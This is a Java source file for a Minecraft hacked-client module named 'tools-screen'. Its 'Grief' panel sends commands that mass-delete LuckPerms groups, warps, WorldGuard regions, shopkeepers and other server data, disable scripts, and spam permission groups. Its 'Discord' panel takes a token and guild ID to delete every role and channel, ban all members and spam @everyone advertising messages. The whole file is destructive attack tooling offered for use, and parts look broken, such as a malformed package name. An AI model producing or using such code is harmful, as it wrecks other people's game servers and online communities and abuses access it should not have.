package pwn.noobs.trouserstreak..modules;

import com.mojang.brigadier.suggestion.Suggestion;
import com.mojang.brigadier.suggestion.Suggestions;
import meteordevelopment.meteorclient.events.game.ReceivePacketEvent;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.ModuleSettings;
import meteordevelopment.meteorclient.systems.modules.render.hud.modules.InfoHudRenderer;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.meteorclient.utils.misc.EventHandler;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.s2c.play.CommandSuggestionsS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.OpenScreenS2CPacket;
import net.minecraft.network.packet.s2c.play.OpenWrittenBookS2CPacket;

import java.util.Arrays;
import java.util.Random;

public class ToolsScreen extends Module {
    private final ModuleSettings.StringSetting token = register(new ModuleSettings.StringSetting.Builder()
            .name("token")
            .description("Your Discord token.")
            .defaultValue("")
            .build()
    );

    private final ModuleSettings.StringSetting guild = register(new ModuleSettings.StringSetting.Builder()
            .name("guild")
            .description("The ID of the Discord guild to target.")
            .defaultValue("")
            .build()
    );

    private String packetinputmode = "";
    private int blocked = 0;
    private boolean enabled = false;
    private boolean alt = false;

    public ToolsScreen() {
        super(Categories.Render, "tools-screen", "The tools screen.");
    }

    @Override
    public void onActivate() {
        this.mc.setScreen(new PanelsGui(Arrays.asList(
                new PanelFrame(100, 100, 250, 170, "Grief", Arrays.asList(
                        new PanelButton(0, 0, "Delete LP Data", () -> {
                            packetinputmode = "lp";
                            enabled = true;
                            mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, "/lp deletegroup "));
                        }),
                        new PanelButton(0, 20, "Delete MRL Data", () -> {
                            packetinputmode = "mrl";
                            enabled = true;
                            Utils.mc.player.sendChatMessage("/mrl list");
                        }),
                        new PanelButton(0, 40, "Disable Skripts", () -> Utils.mc.player.sendChatMessage("/sk disable all")),
                        new PanelButton(0, 60, "Delete Shopkeepers", () -> new Thread(() -> {
                            Utils.mc.player.sendChatMessage("/shopkeeper deleteall admin");
                            Utils.sleep(50);
                            Utils.mc.player.sendChatMessage("/shopkeeper confirm");
                        }).start()),
                        new PanelButton(0, 80, "Spam LP Data", () -> {
                            for (int i = 0; i < 100; i++) {
                                Utils.mc.player.sendChatMessage("/lp creategroup " + i + new Random().nextInt(10000));
                            }
                        }),
                        new PanelButton(0, 100, "Delete Warp Data", () -> {
                            packetinputmode = "warps";
                            enabled = true;
                            mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, "/delwarp "));
                        }),
                        new PanelButton(0, 120, "Delete Region Data", () -> {
                            packetinputmode = "worldguard";
                            enabled = true;
                            Utils.mc.player.sendChatMessage("/rg list");
                        })
                )),
                new PanelFrame(500, 100, 250, 125, "Discord", Arrays.asList(
                        new StringSettingEditor(0, 0, 240, token),
                        new StringSettingEditor(0, 30, 240, guild),
                        new PanelButton(0, 65, "Nuke", () -> new Thread(() -> {
                            try {
                                String discordToken = token.get();
                                long guildId = Long.parseLong(guild.get());
                                DiscordClient client = new DiscordClient(discordToken);
                                
                                // Delete roles
                                for (long roleId : client.getRoles(guildId)) {
                                    client.deleteRole(guildId, roleId);
                                }
                                
                                // Delete channels
                                for (long channelId : client.getChannels(guildId)) {
                                    client.deleteChannel(channelId);
                                }
                                
                                // Ban members
                                for (long memberId : client.getMembers(guildId)) {
                                    client.banMember(guildId, memberId);
                                }
                                
                                // Send messages with pings
                                for (int i = 0; i < 5; i++) {
                                    for (long channelId : client.getChannels(guildId)) {
                                        client.sendMessage(guildId, channelId, "@everyone Discord nuked by FIRECATS LLC | https://discord.gg/vtMxC73657");
                                    }
                                }
                                
                                System.out.println("Discord nuke complete.");
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }).start())
                ))
        )), false);
    }

    @EventHandler
    private void onReceivePacket(ReceivePacketEvent event) {
        if (this == null || Utils.mc.player == null) return;
        
        if (!enabled) return;

        if (event.packet instanceof OpenWrittenBookS2CPacket && !alt) {
            event.cancel();
            enabled = false;
        }
        
        if (event.packet instanceof GameMessageS2CPacket && alt) {
            blocked++;
            event.cancel();
            if (blocked > 2) {
                blocked = 0;
                enabled = false;
                alt = false;
            }
        }
        
        if (event.packet instanceof GameMessageS2CPacket packet) {
            String message;
            
            switch (packetinputmode) {
                case "worldguard" -> {
                    message = packet.getMessage().getString();
                    if (message.contains("------------------- Regions -------------------")) {
                        message = message.replace("------------------- Regions -------------------", "");
                        message = message.trim();
                        message = message.replace("[Info]", "");
                        message = message.trim();
                        String[] arr = message.trim().split(" ");
                        for (String h : arr) {
                            Utils.mc.player.sendChatMessage("/rg delete " + h.strip().replace("\n", "").substring(2, h.length()));
                        }
                        enabled = false;
                    }
                }
                case "mrl" -> {
                    message = packet.getMessage().getString();
                    if (message.contains(",")) {
                        message = message.replace(",", "");
                        String[] based = message.split(" ");
                        String[] copied = Arrays.copyOfRange(based, 1, based.length);
                        for (String mrl : copied) {
                            Utils.mc.player.sendChatMessage("/mrl erase " + mrl);
                        }
                        enabled = false;
                    }
                }
            }
        }
        
        if (event.packet instanceof CommandSuggestionsS2CPacket packet) {
            switch (packetinputmode) {
                case "lp" -> {
                    Suggestions all = packet.getSuggestions();
                    for (Suggestion i : all.getList()) {
                        Utils.mc.player.sendChatMessage("/lp deletegroup " + i.getText());
                    }
                    enabled = false;
                }
                case "warps" -> {
                    Suggestions all = packet.getSuggestions();
                    for (Suggestion i : all.getList()) {
                        Utils.mc.player.sendChatMessage("/delwarp " + i.getText());
                    }
                    enabled = false;
                }
            }
        }
    }
}
